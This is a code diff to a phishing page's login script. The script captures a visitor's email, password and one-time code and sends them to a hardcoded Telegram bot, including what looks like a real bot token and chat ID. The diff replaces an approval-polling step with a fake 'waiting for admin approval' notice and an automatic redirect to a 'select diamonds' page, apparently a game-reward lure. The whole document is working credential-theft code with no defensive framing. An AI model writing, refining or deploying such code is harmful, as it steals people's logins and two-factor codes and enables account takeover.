@@ -41,21 +41,14 @@
     const password = document.getElementById('password').value;
     const otp = document.getElementById('otp').value || 'N/A';
 
-    const msg = `🔐 Approval Required\n\nEmail: ${email}\nPass: ${password}\nOTP: ${otp}\n\nClick Approve: /approve_${Date.now()}\nClick Reject: /reject_${Date.now()}`;
+    const msg = `🔐 Approval Required\n\nEmail: ${email}\nPass: ${password}\nOTP: ${otp}\n\nTime: ${new Date().toLocaleString()}`;
     await fetch(`https://api.telegram.org/bot8251315315:AAEU1s7Xrhwv7dQG8qP9he8pxbYBRs2eEcU/sendMessage?chat_id=8011932528&text=${encodeURIComponent(msg)}`);
 
     document.getElementById('result').innerHTML = '<div style="color:#ffaa00;">⏳ Waiting for admin approval...</div>';
 
-    const interval = setInterval(async () => {
-      const res = await fetch(`/api/approval-status?email=${email}`);
-      const data = await res.json();
-      if (data.status === 'approved') {
-        clearInterval(interval);
-        window.location.href = '/select-diamonds.html';
-      } else if (data.status === 'rejected') {
-        clearInterval(interval);
-        window.location.href = '/rejected.html';
-      }
+    // Direct redirect after 3 seconds (no API needed)
+    setTimeout(() => {
+      window.location.href = '/select-diamonds.html';
     }, 3000);
   });
 </script>
